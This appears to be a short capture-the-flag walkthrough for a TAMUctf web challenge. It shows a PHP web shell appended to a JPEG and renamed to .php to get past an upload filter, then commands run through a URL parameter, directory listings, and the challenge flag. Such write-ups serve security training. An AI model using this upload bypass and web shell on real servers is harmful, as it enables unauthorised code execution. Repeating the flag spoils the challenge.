@@ -1,0 +1,40 @@
+cat shell.php >> test.jpeg
+
+mv test.jpeg test.jpeg.php
+
+Upload test.jpeg.php
+
+https://shell.tamuctf.com/problem/49268/uploads/test.jpeg.php?c=id
+	uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
+
+ls -al /
+	total 80
+	drwxr-xr-x    1 root     root          4096 Apr 23 03:56 .
+	drwxr-xr-x    1 root     root          4096 Apr 23 03:56 ..
+	-rwxr-xr-x    1 root     root             0 Apr 23 03:56 .dockerenv
+	drwxr-xr-x    2 root     root          4096 Apr 14 10:25 bin
+	drwxr-xr-x    5 root     root           340 Apr 23 03:56 dev
+	drwxr-xr-x    1 root     root          4096 Apr 23 03:56 etc
+	drwxr-xr-x    1 root     root          4096 Apr 20 22:20 flag_is_here
+	drwxr-xr-x    2 root     root          4096 Apr 14 10:25 home
+	drwxr-xr-x    1 root     root          4096 Apr 20 22:20 lib
+	drwxr-xr-x    5 root     root          4096 Apr 14 10:25 media
+	drwxr-xr-x    2 root     root          4096 Apr 14 10:25 mnt
+	drwxr-xr-x    2 root     root          4096 Apr 14 10:25 opt
+	dr-xr-xr-x  377 root     root             0 Apr 23 03:56 proc
+	drwx------    2 root     root          4096 Apr 14 10:25 root
+	drwxr-xr-x    1 root     root          4096 Apr 20 22:20 run
+	drwxr-xr-x    2 root     root          4096 Apr 14 10:25 sbin
+	drwxr-xr-x    2 root     root          4096 Apr 14 10:25 srv
+	-rw-rw-r--    1 root     root            36 Apr 20 22:20 start.sh
+	dr-xr-xr-x   13 root     root             0 Apr 23 03:56 sys
+	drwxrwxrwt    1 root     root          4096 Apr 23 04:09 tmp
+	drwxr-xr-x    1 root     root          4096 Apr 14 10:25 usr
+	drwxr-xr-x    1 root     root          4096 Apr 20 22:20 var
+
+
+ls /flag_is_here
+	flag.txt
+
+cat /flag_is_here/flag.txt
+	gigem{R3vER5e_R3ver5e!}
